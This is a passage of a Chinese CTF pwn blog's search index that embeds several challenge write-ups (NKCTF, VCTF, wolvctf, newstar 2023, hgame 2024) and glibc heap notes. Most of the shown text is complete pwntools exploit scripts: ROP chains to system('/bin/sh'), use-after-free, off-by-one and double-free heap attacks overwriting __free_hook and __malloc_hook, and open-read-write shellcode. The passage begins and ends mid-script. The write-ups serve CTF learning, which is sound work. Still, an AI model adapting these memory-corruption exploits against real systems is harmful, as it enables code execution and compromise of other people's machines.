p.recvuntil(&amp;quot;0x&amp;quot;)
libc = int(p.recv(12),16) + 0x30 - 0x29dc0
print(&amp;quot;libc  =&amp;quot;,hex(libc))

rdi = libc + 0x2a3e5
rdx = libc + 0x11f2e7
rsi = libc + 0x2be51
ret = libc + 0x29139
sh = libc + 0x1D8678
sys = libc + 0x50D70
uid = libc + 0xEC0D0

payload = b&#39;a&#39;*40 + p64(can) + p64(0xdeadbeef) + p64(rdi) + p64(0) + p64(uid) + p64(rdi) + p64(sh)  + p64(sys) 
#pause()
p.sendlineafter(b&amp;quot;maimai?\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;pallu&#34;&gt;pallu&lt;/h1&gt;
&lt;p&gt;比赛的时候就没看到gift这里末尾没置0🤡，就看到设置标签时可能有个溢出，学习wp后发现是通过gift泄露libc基地址和栈地址，通过起名也能泄露堆地址，主要攻击思路就是把在栈上申请堆块，控制执行流&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./pallu&#39;)

def get(idx):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;index:&amp;quot;, str(idx))

def gift(content):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;8&amp;quot;)
	p.sendlineafter(&amp;quot;code:&amp;quot;, content)
    	
def kill(idx):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;5&amp;quot;)
	p.sendlineafter(&amp;quot;x:&amp;quot;, str(idx))

def sset(idx, content):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;2&amp;quot;)
	p.sendlineafter(&amp;quot;x:&amp;quot;, str(idx))
	p.sendlineafter(&amp;quot;Labels:&amp;quot;, content)
	
def breed(idx1,idx2,content):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;4&amp;quot;)
	p.sendlineafter(&amp;quot;x:&amp;quot;, str(idx1))
	p.sendlineafter(&amp;quot;x:&amp;quot;, str(idx2))
	p.sendlineafter(&amp;quot;(y/n)&amp;quot;, b&#39;y&#39;)
	p.sendafter(&amp;quot;name:&amp;quot;, content)
def exit_():
	p.sendlineafter(&amp;quot;choice:&amp;quot;, b&amp;quot;10&amp;quot;)


#gdb.attach(p)
gift(b&#39;a&#39;*15)
libc = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x3c38e0
print(&amp;quot;libc = &amp;quot;,hex(libc))
gift(b&#39;a&#39;*71)
stack = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x20
print(&amp;quot;stack = &amp;quot;,hex(stack))

get(1)#0x500
get(2)#0x930
breed(0,1,b&#39;h&#39;*0x10)
p.recvuntil(b&#39;h&#39;*0x10)
p.recvuntil(b&#39;h&#39;*0x10)
heap = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x950
print(&amp;quot;heap = &amp;quot;,hex(heap))
kill(2)
kill(1)
kill(0)
get(3) 
get(3) 
kill(0) 
get(1) 
get(1) 
kill(2) 
sset(0,b&#39;g&#39;*0x500+p64(0)+p64(0x221)+p64(0x7f8796c7ad78-0x7f87968b7000+libc)+p64(stack-0x30))
giftcode=b&#39;Happy NKCTF2024!&#39;
giftcode=giftcode.ljust(0x10,b&#39;\0&#39;)
giftcode+=p64(0)+p64(0)+p64(stack-0x30)+p64(0)
giftcode+=p64(0)+p64(0)+p64(heap)+p64(stack-0x50)

gift(giftcode)
#pause()
print(&amp;quot;send giftcode2&amp;quot;)
gift(b&#39;Welcome PalluWorld!&#39;)

one=libc+0x4525a

sset(3,b&#39;\x00&#39;*4*8+p64(0xdeadbe00)+p64(one)+p64(0)*10)

exit_()

p.interactive()

&lt;/code&gt;&lt;/pre&gt;
">NKCTF</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/vctf-na-xin-sai/"" data-c="
          &lt;h1 id=&#34;ezhp_code&#34;&gt;ezhp_code&lt;/h1&gt;
&lt;h2 id=&#34;add函数&#34;&gt;add函数&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710941694813.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
程序有后门函数，并且add功能中存在漏洞&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710941285882.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
如果a1+40的位置有值，则直接执行，但是程序在del功能中将该位置置0，但是未对内容的堆清零，所以设法把内容chunk分配给漏洞chunk，但是按tchace的先进后出特性无法实现，发现限制8个chunk，所以把tchace堆填满即可实现&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710941419440.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./pwn&#39;)
sys = 0x4012A5

def add(size):
	p.sendlineafter(&amp;quot;exit\n&amp;quot;, &amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;name:\n&amp;quot;, b&#39;a&#39;*40 + p64(sys))
	p.sendlineafter(&amp;quot;say:\n&amp;quot;, str(size))
	p.sendlineafter(&amp;quot;say:\n&amp;quot;, b&#39;a&#39;*40 + p64(sys))
    	
def dele():
	p.sendlineafter(&amp;quot;exit\n&amp;quot;, &amp;quot;2&amp;quot;)
	
#gdb.attach(p)
add(71)
add(71)
add(71)
add(71)
dele()
dele()
dele()
dele()
#pause()
p.sendlineafter(&amp;quot;exit\n&amp;quot;, &amp;quot;1&amp;quot;)

#pause()
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">VCTF纳新赛</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/wolvctf/"" data-c="
          &lt;h1 id=&#34;byteoverflow&#34;&gt;byteoverflow&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710677282987.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现无法修改got表项，开启了栈可执行，所以可以在栈上布置shellcode，再设法执行，发现程序存在多次一字节溢出，并且还有一次格式化字符串，可以通过格式化字符串泄露栈地址，再通过一字节溢出控制rsp从而控制执行流&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import*
p=process(&amp;quot;./byteoverflow&amp;quot;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

#gdb.attach(p)
p.sendlineafter(&amp;quot;EXIT\n\n&amp;quot;,b&#39;2&#39;)
payload = b&#39;%38$p&#39;
p.sendlineafter(&amp;quot;below: \n\n&amp;quot;,payload)
p.recvuntil(b&#39;0x&#39;)
stack = int(p.recv(12),16)
print(hex(stack))
sc = asm(shellcraft.sh())
p.sendlineafter(&amp;quot;EXIT\n\n&amp;quot;,b&#39;1&#39;)
ret = stack - 0x80
pay = p64(ret + 0x10)*22 + sc 
payload = pay.ljust(0x100,b&#39;a&#39;) + p8(ret&amp;amp;0xff)
#pause()
p.sendlineafter(&amp;quot;Mode\n\n&amp;quot;,payload)
#pause()

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710677509264.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;deepstring&#34;&gt;DeepString&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710685980984.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710686002366.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现程序把功能函数写在了栈上，根据偏移调用函数，并且发现输入负数偏移可以造成数组溢出实现控制执行流，程序中存在reflect函数，存在格式化字符串漏洞，可以泄露libc基地址&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710686177171.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710686044642.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import*
p = process(&amp;quot;./DeepString&amp;quot;)
elf = ELF(&amp;quot;./DeepString&amp;quot;)
libc = elf.libc
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

#gdb.attach(p)
reflect = 0x401405
p.sendlineafter(b&amp;quot;reverse\n\n&amp;quot;,b&#39;-37&#39;)
pay = b&#39;%29$paaa&#39; + p64(reflect)
p.sendlineafter(b&amp;quot;STRING: \n&amp;quot;,pay)
p.recvuntil(&amp;quot;0x&amp;quot;)
base = int(p.recv(12),16) - 16 - 0xf80d0
print(hex(base))
sys = base + 0x4C330
p.sendlineafter(b&amp;quot;reverse\n\n&amp;quot;,b&#39;-37&#39;)
pay = b&#39;/bin/sh\x00&#39; + p64(sys)
#pause()
p.sendlineafter(b&amp;quot;STRING: \n&amp;quot;,pay)
#pause()

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">wolvctf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/newstar-2023-week4/"" data-c="
          &lt;h1 id=&#34;ezpwnuaf&#34;&gt;ezpwn（UAF）&lt;/h1&gt;
&lt;p&gt;2.31&lt;/p&gt;
&lt;h2 id=&#34;add&#34;&gt;add&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710246482638.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
申请时先申请一个固定大小0x20的堆来存放每一页的地址，然后每一页存放着size和内容&lt;/p&gt;
&lt;h2 id=&#34;delete&#34;&gt;delete&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710246509890.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
释放那个0x20的堆&lt;/p&gt;
&lt;h2 id=&#34;show&#34;&gt;show&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710246536742.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;edit&#34;&gt;edit&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710246557783.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这里对编辑的大小有一个检查&lt;/p&gt;
&lt;p&gt;程序存在UAF漏洞，所以可以通过free两个堆，再申请一个，从而申请到第一个堆的控制页，可以实现任意地址写，发现one_gadgets的条件无法满足，无法直接控制寄存器，但是如果条件在栈上则可以通过同时修改realloc_hook和malloc_hook实现调栈，所以选择改free_hook，由于开了PIE所以需要通过申请mmap申请的堆来泄露libc基地址&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
 
libc = ELF(&#39;./libc-2.31.so&#39;)
 
p = process(&#39;./pwn&#39;)
context(arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
 
def add(idx, size, msg=b&#39;/bin//sh&#39;):
    p.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;&amp;quot;, b&#39;1&#39;)
    p.sendlineafter(b&amp;quot;enter idx(0~15): \n&amp;quot;, str(idx).encode())
    p.sendlineafter(b&amp;quot;enter size: \n&amp;quot;, str(size).encode())
    p.sendlineafter(b&amp;quot;write the note: \n&amp;quot;, msg)
 
def free(idx):
    p.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;&amp;quot;, b&#39;2&#39;)
    p.sendlineafter(b&amp;quot;enter idx(0~15): \n&amp;quot;, str(idx).encode())
 
def show(idx):
    p.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;&amp;quot;, b&#39;3&#39;)
    p.sendlineafter(b&amp;quot;enter idx(0~15): \n&amp;quot;, str(idx).encode())
 
def edit(idx, msg):
    p.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;&amp;quot;, b&#39;4&#39;)
    p.sendlineafter(b&amp;quot;enter idx(0~15): \n&amp;quot;, str(idx).encode())
    p.sendlineafter(b&amp;quot;enter content: \n&amp;quot;, msg)
#gdb.attach(p)
add(0, 0x21000)
add(1, 0x40)
add(2, 0x40)
add(3, 0x40)

free(0)
free(1)

add(4, 0x20 , b&#39;a&#39;*24)

show(4)
libc_base = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) + 0x21ff0
print(f&amp;quot;{ libc_base = :x}&amp;quot;)
free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
print(f&amp;quot;{ free_hook = :x}&amp;quot;)
edit(4,p64(0x21000) + p64(0)*2 + p64(free_hook))
sys = libc_base + libc.sym[&#39;system&#39;]

edit(0,p64(sys))
edit(4, b&#39;/bin//sh&#39;)
#pause()
free(0)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;god_of_changeoff-by-one&#34;&gt;god_of_change（off-by-one）&lt;/h1&gt;
&lt;p&gt;2.31&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1710333803521.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现程序存在一个字节溢出，打堆覆盖&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
 
libc = ELF(&#39;./libc-2.31.so&#39;)
 
p = process(&#39;./pwn&#39;)
context(arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
 
def add(size, msg=b&#39;/bin//sh&#39;):
    p.sendlineafter(b&amp;quot;Your Choice: &amp;quot;, b&#39;1&#39;)
    p.sendlineafter(b&amp;quot;size: &amp;quot;, str(size).encode())
    p.sendafter(b&amp;quot;the content: \n&amp;quot;, msg)
 
def free(idx):
    p.sendlineafter(b&amp;quot;Your Choice: &amp;quot;, b&#39;3&#39;)
    p.sendlineafter(b&amp;quot;idx: &amp;quot;, str(idx).encode())
 
def show(idx):
    p.sendlineafter(b&amp;quot;Your Choice: &amp;quot;, b&#39;2&#39;)
    p.sendlineafter(b&amp;quot;idx: \n&amp;quot;, str(idx).encode())
    p.recvline()

#gdb.attach(p)

add(0x18)
add(0x18)
add(0x38)
for _ in range(9):
	add(0x78)

free(0)
add(0x18,b&#39;\x00&#39;*0x18 + b&#39;\x61&#39;)
free(1)
add(0x58,p64(0)*3 + p64(0x441))
free(2)
add(0x38)
show(3)
libc_base = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 96 - libc.sym[&#39;__malloc_hook&#39;] - 0x10
print(f&amp;quot;{ libc_base = :x}&amp;quot;)
sys = libc_base + libc.sym[&#39;system&#39;]
free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
print(f&amp;quot;{ free_hook = :x}&amp;quot;)

add(0x38)
free(3)
free(2)
free(1)
add(0x58, flat(b&#39;/bin/sh\x00&#39;,0,0,0x41, p64(free_hook)))
add(0x38)
add(0x38, p64(sys))
free(1)

p.interactive()
 
&lt;/code&gt;&lt;/pre&gt;
">newstar 2023 week4</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/glibc-dui-li-yong/"" data-c="
          &lt;p&gt;学习链接：&lt;a href=&#34;https://blog.csdn.net/qq_41453285/article/details/96865321&#34;&gt;https://blog.csdn.net/qq_41453285/article/details/96865321&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;arena&#34;&gt;arena&lt;/h1&gt;
&lt;p&gt;每个分配区（arena）都是结构体 malloc_state 的一个实例，ptmalloc 使用 malloc_state 来管理分配区。在 pwndbg 中可以使用 arena ​查看结构体内存储的数据&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1709627315286.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;malloc&#34;&gt;malloc&lt;/h1&gt;
&lt;p&gt;每次malloc申请得到的内存指针，其实指向user data的起始处。而在除了tcache的各类bin的链表中fd与bk等指针却指向着chunk header，tcache中next指针指向user data&lt;/p&gt;
&lt;h2 id=&#34;mmap申请阈值0x20000128kb&#34;&gt;mmap申请阈值（0x20000（128kb））&lt;/h2&gt;
&lt;h1 id=&#34;bin&#34;&gt;bin&lt;/h1&gt;
&lt;h2 id=&#34;tcache-bins24~0x408单链表先进后出&#34;&gt;tcache bins(24~0x408)（单链表，先进后出）&lt;/h2&gt;
&lt;h2 id=&#34;fast-bin0x20~0x80单链表先进后出&#34;&gt;fast bin(0x20~0x80)（单链表，先进后出）&lt;/h2&gt;
&lt;p&gt;1.mallopt(1,0)即mallopt(M_MXFAST,0)将 MAX_FAST_SIZE设为0，禁用fast bin&lt;br&gt;
2. 当一个堆块加进fast bin时，不会对下一个堆块的PREV_INUSE进行验证（但是会对下一个堆块size的合法性进行检查），同样地，将一个堆块从fast bin中释放的时候，也不会对其下一个堆块的PREV_INUSE进行更改（也不会改下一个堆块的PREV_SIZE），只有触发&lt;code&gt;malloc_consolidate()&lt;/code&gt;后才会改下一个堆块的PREV_INUSE。&lt;br&gt;
3. 利用&lt;code&gt;find_fake_fast target_addr&lt;/code&gt;gdb命令可以找到目标地址附近的fake fast bin，只考虑size大小即可，不需要考虑对齐&lt;br&gt;
4. &lt;code&gt;p &amp;amp;global_max_fast&lt;/code&gt;可以找到MAX_FAST_SIZE设为0，禁用fast&lt;/p&gt;
&lt;h3 id=&#34;malloc_consolidate&#34;&gt;malloc_consolidate()&lt;/h3&gt;
&lt;p&gt;其本身会将fast bin内的chunk取出来，与相邻的free chunk合并后放入unsorted bin，或并入top chunk（如果无法与相邻的合并，就直接将其放入unsorted bin），然后由于申请的large chunk显然在fast bin,small bin内都找不到，于是遍历unsorted bin，将其中堆块放入small bin,large bin，因此最终的效果就是fast bin内的chunk与周围的chunk合并了（或是自身直接进入了unsorted bin），最终被放入了small bin,large bin，或者被并入了top chunk，导致fast bin均为空。&lt;/p&gt;
&lt;h4 id=&#34;触发条件&#34;&gt;触发条件：&lt;/h4&gt;
&lt;p&gt;1.申请一个大于large chunk最小大小（包括当申请的chunk需要调用brk()申请新的top chunk或调用mmap()函数时）的堆块&lt;br&gt;
2.若free的chunk和相邻的free chunk合并后的size大于FASTBIN_CONSOLIDATION_THRESHOLD(64k即0x10000)（包括与top chunk合并）&lt;/p&gt;
&lt;h2 id=&#34;unsorted-bin双链表先进先出&#34;&gt;unsorted bin（双链表，先进先出）&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;泄露libc&lt;/strong&gt;：unsorted_bin中最先进来的free chunk的fd指针和最后进来的free chunk的bk指针均指向了main_arena中的位置，在64位中，一般是&amp;lt;main_arena+88&amp;gt;或&amp;lt;main_arena+96&amp;gt;，具体受libc影响，且main_arena的位置与__malloc_hook相差0x10，而在32位的程序中，main_arena的位置与__malloc_hook相差0x18，加入到unsorted bin中的free chunk的fd和bk通常指向&amp;lt;main_arena+48&amp;gt;的位置。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;libc_base = leak_addr - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 - 88
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：从该bins取出的chunk不会对size进行检查&lt;/p&gt;
&lt;h2 id=&#34;small-bins0x20~0x3f0双链表先进先出&#34;&gt;small bins(0x20~0x3F0)（双链表，先进先出）&lt;/h2&gt;
&lt;h2 id=&#34;large-bins0x400~双链表先进先出&#34;&gt;large bins(0x400~)（双链表，先进先出）&lt;/h2&gt;
&lt;h1 id=&#34;进入大循环有2条路径&#34;&gt;进入大循环有2条路径&lt;/h1&gt;
&lt;p&gt;1、请求的堆块为large chunk。&lt;br&gt;
2、small bin中对应的那个bin为空(small bin分配失败！)&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1709372496189.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;free&#34;&gt;free&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709372505070.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">glibc堆利用</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/mprotect/"" data-c="
          &lt;h1 id=&#34;mprotect&#34;&gt;mprotect&lt;/h1&gt;
&lt;h2 id=&#34;函数原型&#34;&gt;函数原型&lt;/h2&gt;
&lt;p&gt;int mprotect(void * addr, size_t len, int prot)&lt;br&gt;
其中变量addr代表对应内存块的指针，len代表内存块的大小，而prot代表内存块所拥有的权限&lt;br&gt;
对于prot来说，对应权限依照以下规则改变值&lt;/p&gt;
&lt;p&gt;无法访问 即PROT_NONE：不允许访问，值为 0&lt;br&gt;
可读权限 即PROT_READ：可读，值加 1&lt;br&gt;
可写权限 即PROT_WRITE：可读， 值加 2&lt;br&gt;
可执行权限 即PROT_EXEC：可执行，值加 4&lt;/p&gt;
&lt;p&gt;例如：我们要将某块内存区域权限设置为可读可写可执行，那么mprotect函数中prot参数便应该是1+2+4=7。&lt;/p&gt;
&lt;h1 id=&#34;mmap&#34;&gt;mmap&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710037729602.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">mprotect，mmap</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/hgame2024week2/"" data-c="
          &lt;h1 id=&#34;shellcodemaster&#34;&gt;shellcodemaster&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709463523175.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1709463620333.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现开了沙盒ban掉了execve等函数，只能打orw，然后是先mmap了一块rwx的内存，然后读取22个字节去执行，然后把权限改为了可执行（4），并且把寄存器放置了一些值，22个字节去打orw肯定是不够的，所以需要再次向该地址写入并执行，所以需要先打开可写权限，由于各个寄存器高四字节均为0，所以改低四字节即可（使用的字节也更少）&lt;/p&gt;
&lt;h2 id=&#34;shl指令&#34;&gt;shl指令&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;shl edi,12            #edi寄存器的值向左移12bits，用0补
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;cdq指令&#34;&gt;cdq指令&lt;/h2&gt;
&lt;p&gt;把EDX的所有位都设成EAX最高位的值。也就是说，当EAX &amp;lt;80000000, EDX 为00000000；当EAX &amp;gt;= 80000000， EDX 则为FFFFFFFF&lt;/p&gt;
&lt;p&gt;恢复权限后调用read函数写入orw的shellcode即可&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import*
p=process(&amp;quot;./vuln&amp;quot;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)
gdb.attach(p)
shellcode1=&#39;&#39;&#39;
shl edi,12
mov dx, 0x7
mov ax, 10
syscall
cdq
mov esi, edi
xor edi, edi
xor eax, eax
syscall
&#39;&#39;&#39;
p.send(asm(shellcode1))
shellcode_orw = asm(&#39;&#39;&#39;
push 0x67616c66
mov rdi,rsp
xor esi,esi
push 2
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
&#39;&#39;&#39;)
p.sendline(b&#39;\x90&#39;*0x16 + asm(&amp;quot;shl rsp, 12; add rsp, 0x500;&amp;quot;) + shellcode_orw)
#nop滑板只要大于22字节就行，主要为了配合执行流，调节栈顶方便push和pop
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;old_fastnote&#34;&gt;old_fastnote&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709630337061.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现got表无法更改，程序也没有edit函数，2.23版本的libc，没有tcache bin，程序也没后门，只能从libc入手，所以首先就要通过unsorted bin泄露libc基地址，然后可以利用double free漏洞实现__malloc_hook的更改，这里需要注意从fast bin中取出chunk时会检查size，但是不要求对齐，gdb有专门的工具指令&lt;code&gt;find_fake_fast target_addr&lt;/code&gt;，可以找到目标地址附近的fake chunk，将__malloc_hook改为one_gadgets即可拿到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./vuln&#39;)
libc = ELF(&#39;./libc-2.23.so&#39;)
def add(idx,size,content):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;Size: &amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;Content: &amp;quot;)
	p.sendline(content)

def show(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;2&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	
def dele(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;3&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
#gdb.attach(p)

add(0,0x80,b&#39;a&#39;*8)
add(1,0x60,b&#39;a&#39;*8)
add(2,0x60,b&#39;a&#39;*8)
dele(0)
add(0,0x80,&#39;\x78&#39;)
show(0)
base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x3C0A78
malloc_hook = base + libc.sym[&#39;__malloc_hook&#39;]
one = 0xf1247
gadget = base + one
fake = malloc_hook - 0x23 
add(0, 0x80, b&#39;a&#39;) 
dele(1) 
dele(2) 
dele(1) 
add(3, 0x60, p64(fake)) 
print(hex(malloc_hook))
add(4, 0x60, b&#39;a&#39;) 
add(5, 0x60, b&#39;a&#39;) 
add(6, 0x60, b&#39;a&#39; * 0x13 + p64(gadget)) 
#pause()
p.recvuntil(&amp;quot;:&amp;quot;)
p.sendline(b&amp;quot;1&amp;quot;)
p.recvuntil(&amp;quot;Index: &amp;quot;)
p.sendline(str(11))
p.recvuntil(&amp;quot;Size: &amp;quot;)
p.sendline(str(0x60))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里改完_malloc_hook之后触发double free错误也可以拿到shell（实际上当printf函数输出较多内容时也会调用malloc和free函数来申请释放缓冲区，scanf函数也是如此）&lt;br&gt;
详情见：&lt;a href=&#34;https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/&#34;&gt;https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;elden-ring-ii&#34;&gt;Elden Ring Ⅱ&lt;/h1&gt;
&lt;p&gt;2.31的libc，存在UAF漏洞，先利用unsorted bin泄露libc基地址，然后利用UAF漏洞申请并修改free_hook得到shell(由于只能申请16次，并且不能重复申请相同的页数，所以无法利用double free漏洞)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./vuln&#39;)
libc = ELF(&#39;./libc.so.6&#39;)
def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)
	p.sendline(b&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;Size: &amp;quot;)
	p.sendline(str(size))
	
def edit(idx,content):
	p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)
	p.sendline(b&amp;quot;3&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;Content: &amp;quot;)
	p.sendline(content)

def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)
	p.sendline(b&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)
